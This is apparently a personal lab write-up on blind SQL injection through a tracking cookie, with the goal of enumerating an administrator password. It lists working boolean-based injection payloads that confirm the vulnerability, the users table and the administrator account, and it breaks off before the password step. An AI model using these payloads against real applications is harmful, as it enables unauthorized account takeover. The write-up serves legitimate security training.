Lab 11 - Blind SQL injection with conditional responses

Vulnerable parameter - tracking cookie

End goals - 
    1 . Enumerate the password of the administrator
    2. Log in as the administrator user

Analysis:
    Testing for blind based injection - find out how application is responses to true usecase and false usecase. If the application responses differently on both the usecases, then we can successfully exploit the application with blind SQLi.

    1. Confirm that the parameter is vulnerable to blind SQLi
    For this, imagine the query in in backend look likes:
        SELECT tracking_id from tracking_table WHERE tracking_id = 'djfjjf23DWE233'
    -> If this tracking id exist => query returns value => Welcome back message displayed
    -> If the tracking id doesn't exist => query returns nothing => no Welcome back message

    Attacking queries : 
    SELECT tracking_id from tracking_table WHERE tracking_id = 'djfjjf23DWE233' AND 1=1--'
    ' AND 1=1-- => TRUE => Welcome back message
    ' AND 1=2-- => FALSE => No Welcome back message

    2. Confirm that we have a users table 
    ' AND (SELECT 'x' FROM users LIMIT 1)='x'-- => TRUE => 'users' table exist in the browser.

    3. Confirm username 'administrator' exist in the 'users' table
    ' AND (SELECT username FROM users WHERE username='administrator')= 'administrator'-- => TRUE => 'administrator' user exist in 'users' table

    4. Enumerate the password of the 'administrator' user
